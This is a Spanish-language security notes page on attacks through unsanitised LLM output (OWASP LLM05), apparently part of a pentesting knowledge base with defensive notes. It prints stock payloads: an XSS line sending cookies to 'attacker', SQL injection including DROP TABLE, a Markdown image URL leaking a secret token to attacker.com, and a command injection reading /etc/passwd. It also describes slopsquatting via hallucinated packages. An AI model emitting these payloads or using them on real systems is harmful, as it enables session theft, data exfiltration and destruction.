---
title: LLM Output Attacks (Improper Output Handling, LLM05)
slug: llm-output-attacks
category: techniques
updated: 2026-06-30
summary: "LLM output → XSS/SQLi/RCE/Markdown-exfil/hallucinated-pkgs; payloads + oracle questions"
tags: [llm, llm05, xss, sqli, rce, exfiltration]
sensitive: false
---

# LLM Output Attacks (LLM05 — Improper Output Handling)

## When to use
Cuando la app consume el output del LLM sin sanitizar: lo renderiza en HTML, lo
mete en queries SQL, lo ejecuta como comando, o lo procesa como Markdown.
**Premisa: el output de un LLM es DATO NO CONFIABLE.**

## Key facts / commands

### Vectores de ataque
| Vector | Mecanismo | Impacto |
|---|---|---|
| XSS | LLM genera `<script>` tags | Cookie steal / session hijack |
| SQL Injection | LLM como traductor NL→SQL inyecta queries | Exfil/destrucción de DB |
| Code Injection | Separadores `;`, `\|`, `&&` en output | RCE en servidor |
| Function Call Abuse | LLM llama funciones con params maliciosos | Acciones no autorizadas |
| Markdown Exfil | `![x](http://attacker/?data=SECRET)` | Exfil via render de imagen |
| Hallucinated Packages | LLM sugiere paquetes inexistentes | Supply chain / typosquatting |

### XSS via LLM
```html
<script>document.location='http://attacker/'+document.cookie</script>
```
La app renderiza el output sin sanitizar → XSS.

### SQL Injection via LLM
```sql
-- "Show me all users with admin role" →
SELECT * FROM users WHERE role='admin' OR '1'='1' --
-- input malicioso encadenado:
...'; DROP TABLE users;--
```

### Markdown image exfiltration
```markdown
![x](http://attacker.com/log?data=SECRET_TOKEN)
```
Si el cliente renderiza Markdown → petición HTTP automática con datos sensibles.

### Code injection
```
Input: "Run today's date; cat /etc/passwd"
LLM output: "date; cat /etc/passwd"  → ejecución de comandos si no se sanitiza
```

### Hallucinated packages (slopsquatting)
- LLM inventa nombres de paquetes inexistentes.
- Atacante registra esos paquetes en npm/PyPI con código malicioso.
- Víctima instala → compromiso de supply chain. **Verificar existencia antes de instalar.**

### Defensa — Model Armor / ShieldGemma
```python
from google.cloud import modelarmor_v1
client = modelarmor_v1.ModelArmorClient()
# Input del usuario
client.sanitize_user_prompt(request={"name": template_name, "user_prompt_data": {"text": user_input}})
# Output del modelo
client.sanitize_model_response(request={"name": template_name, "model_response_data": {"text": model_output}})
```
Detecta: hate speech, PII (SSN, tarjetas), prompt injection, malicious URIs, CSAM.

## Gotchas
- Preguntas oracle para cada output del LLM:
  - ¿Se renderiza en HTML? → XSS
  - ¿Se usa en queries SQL? → SQLi
  - ¿Se ejecuta como comando? → RCE
  - ¿Incluye Markdown con imágenes? → exfiltración
  - ¿Sugiere librerías? → verificar existencia antes de instalar
- LLM05 = "Improper Output Handling" = falta de sanitización de outputs.

## References
- Relacionado: [[prompt-injection]], [[attacking-ai-llm]], [[web-app-attacks]], [[ai-defenses]]
- Lecciones_05_LLMOutputAttacks.md
